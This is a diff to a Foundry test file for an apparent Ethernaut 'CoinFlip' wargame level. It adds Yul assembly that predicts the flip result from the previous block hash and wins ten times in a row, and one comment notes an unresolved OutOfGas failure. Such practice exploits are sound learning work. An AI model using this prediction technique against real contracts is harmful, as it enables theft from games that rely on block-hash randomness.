@@ -32,30 +32,49 @@ contract CoinFlipTest is BaseTest {
         assertEq(coinFlipInstance.consecutiveWins(), 10);
     }
 
-    function exploitYul() internal override {
-        //! TODO: Fix it
-        address _vmAddress = VM_ADDRESS;
-        address _cfiAddress = address(coinFlipInstance);
+    function exploitYulLoopedInSol() internal {
         assembly {
             mstore(0, 0x1d263f67) //! mem[28:32] = 0x1d263f67 -> Signature for flip(bool)
-        //         //! mem[32:64] = _side value
-        //     mstore(64, 0x1f7b4f30) //! mem[64:96] = 0x1f7b4f30 -> Signature for roll(uint)
-        //     for { let i := 0 } lt(i, 10) { i := add(i, 1) } {
-        //         let _blockValue := blockhash(sub(number(), 1))
-        //         let _coinFlip := div(_blockValue, FACTOR)
-        //         switch eq(_coinFlip, 1)
-        //             case 1 { mstore(32, 1) }
-        //             default { mstore(32, 0) }
 
-        //         pop(call(gas(), _cfiAddress, 0, 28, 36, 0, 0))
-        //         pop(call(gas(), _vmAddress, 0, 92, 96, 0, 0))
-        //     }
+            let _blockValue := blockhash(sub(number(), 1))
+            let _guess := div(_blockValue, FACTOR)
+            mstore(32, _guess)
+
+            pop(call(gas(), sload(coinFlipInstance.slot), 0, 28, 36, 0, 0))
+        }
+    }
+
+    function exploitYul() internal override {
+        address _vmAddress = VM_ADDRESS;
+        assembly {
+            mstore(0, 0x1d263f67) //# mem[28:32] = 0x1d263f67 -> Signature for flip(bool)
+            //         //# mem[32:64] = _side value
+            mstore(64, 0x1f7b4f30) //# mem[64:96] = 0x1f7b4f30 -> Signature for roll(uint)
+            for { let i := 0 } lt(i, 2) { i := add(i, 1) } {
+                let _blockValue := blockhash(sub(number(), 1))
+                let _guess := div(_blockValue, FACTOR)
+                mstore(32, _guess)
+
+                pop(call(gas(), sload(coinFlipInstance.slot), 0, 28, 36, 0, 0))
+                mstore(96, add(number(), 2)) //# mem[96:108] = 2 -> Blocks to increase after every call to filp
+                pop(call(gas(), _vmAddress, 0, 92, 36, 0, 0))
+            }
         }
     }
 
     function testExploitYul() public override {
-                uint a = 1 + 2;
-                // exploitYul();
+        exploitYul();
+        // assertEq(coinFlipInstance.consecutiveWins(), 10); //! Fails due to [FAIL. Reason: EvmError: OutOfGas] testExploitYul() (gas: 9223372036854754743). Maybe an internal call, couldn't be found in trace.
+    }
 
+    function testExploitYulLoopedInSol() public {
+        for (uint256 i; i < 10;) {
+            exploitYulLoopedInSol();
+            unchecked {
+                ++i;
+            }
+            vm.roll(block.number + 2); // Move 1 block ahead so lastHash != blockValue
+        }
+        assertEq(coinFlipInstance.consecutiveWins(), 10);
     }
 }
